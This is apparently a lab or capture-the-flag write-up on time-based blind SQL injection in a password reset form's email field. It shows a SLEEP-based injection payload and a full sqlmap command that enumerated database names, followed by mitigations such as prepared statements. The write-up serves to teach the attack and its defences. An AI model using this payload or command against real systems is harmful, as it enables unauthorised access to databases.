# Time-Based Blind SQL Injection

## 🎯 Objective
Extract database information through time-based blind SQL injection when no visual indicators exist.

## 🔍 Vulnerability Analysis
- **Type**: Time-Based Blind SQL Injection
- **Target**: Password reset functionality
- **Parameter**: Email field in forgot password form
- **Challenge**: Identical responses for all inputs
- **Impact**: Database enumeration through timing side-channels

## 💥 Exploitation

### Manual Confirmation
**Payload**: `' OR SLEEP(5)--`
**Result**: 5-second delay confirms time-based injection

### Automated Enumeration
```bash
sqlmap -u "https://target/" --forms --crawl=2 \
  --technique=T --time-sec=5 --batch --dbs
Result: Extracted database name: utopia

🛡️ Mitigation Strategies
Query Parameterization: Use prepared statements exclusively

Input Sanitization: Strict type and format validation

Rate Limiting: Implement request throttling to hinder timing attacks

Timeout Configuration: Set low database query timeouts

📊 Skills Demonstrated
Timing Analysis: Exploiting response time differences for data extraction

Patience in Exploitation: Working with slow, deliberate attack techniques

Tool Configuration: Proper sqlmap flags for time-based injection

Side-Channel Attacks: Understanding and exploiting timing side-channels

Conducted in controlled environment for educational purposes. All sensitive information (IPs, credentials, session tokens) has been sanitized for security.
